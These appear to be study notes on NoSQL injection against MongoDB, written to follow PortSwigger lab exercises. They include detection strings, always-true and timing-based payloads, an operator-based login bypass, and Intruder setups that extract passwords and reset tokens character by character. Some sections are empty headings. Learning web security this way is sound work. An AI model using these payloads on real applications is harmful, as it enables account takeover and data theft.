# NoSQLInjection
More information : [ NoSQL databases ](https://portswigger.net/web-security/nosql-injection/nosql-databases)

There are two different types of NoSQL injection: 
- **Syntax injection** : can break the NoSQL query syntax, enabling you to inject your own payload.
- **Operator injection** : can use NoSQL query operators to manipulate queries

## NoSQL syntax injection 
1. **Detecting syntax injection in MongoDB**  
To test whether the input may be vulnerable, submit a fuzz string in the value of the parameter. An example string for MongoDB is: 
    ```
    '"`{
    ;$Foo}
    $Foo \xYZ
    ```

2. **Determining which characters are processed**  
    Submit `'`.
   
    If this causes a change from the original response, this may indicate that the `'` character has broken the query syntax and caused a syntax error.  

   If this doesn't cause a syntax error, this may mean that the application is vulnerable to an injection attack.

4. **Confirming conditional behavior**  
Next step is boolean conditions using NoSQL syntax.
To test this, send requests following :
    ```
    ' && 0 && 'x
    ' && 1 && 'x
    ```
    If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. 

5. **Overriding existing conditions**  
Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as 
    ```
    '||1||'
    ```
    As the injected condition is always true, the modified query returns all items.
   
   You could also add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored.
    ```
    /product/lookup?category=fizzy'%00
    ```

## NoSQL operator injection



## Exploiting syntax injection to extract data 



## Exploiting NoSQL operator injection to extract data



## Timing based injection
```
{"$where": "sleep(5000)"}
```
The following timing based payloads will trigger a time delay if the password beings with the letter `a`:
```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```
```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```


### Labs Portswigger
1. Detecting NoSQLInjection
```
GET /filter?category=Pets'||1||'
```
2. Exploiting NoSQL operator injeciton bypass authentication
```json
{
    "username": {
        "$regex": "admin.*"
    },
    "password": {
        "$ne": ""
    }
}
```
3. Exploiting NoSQL injection to extract data
>In `GET /user/lookup?user=wiener`, determine password length
```
administrator' && this.password.length < 30 || 'a'=='b
```
>In Intruder, select Cluster bomb attack and payload set 1 is Numbers 0 to 7, set 2 is a-z.
```
administrator' && this.password[§0§]=='§a§
```
4. Exploiting NoSQL operator injection to extract unknown fiekds
>4.1 In Intruder, construct an attack to identify all the fields on the user object:  
>4.2 The first identifies the character position number, and the second identifies the character itself.  
>4.3 Select Cluster bomb attack and payload set 1 is Numbers 0 to 20, set 2 is 0-9a-zA-z.  
```
{
    "username": "carlos",
    "password": {
        "$ne": "invalid"
    },
    "$where": "Object.keys(this)[1].match('^.{§§}§§.*')"
}
```
>4.4 Repeat the above steps to identify further JSON parameters.  
```
"$where":"Object.keys(this)[2].match('^.{}.*')"
```
>4.5 Send `GET /forgot-password` to repeater, and send `GET /forgot-password?foo=invalid` then, send `GET /forgot-passeord?YOURTOKENNAME=foo`.  
>4.6 In intruder
```
"$where":"this.YOURTOKENNAME.match('^.{§§}§§.*')"
```
>4.7 Send `GET /forgot-password?YOURTOKENNAME=TOKENVALUE`
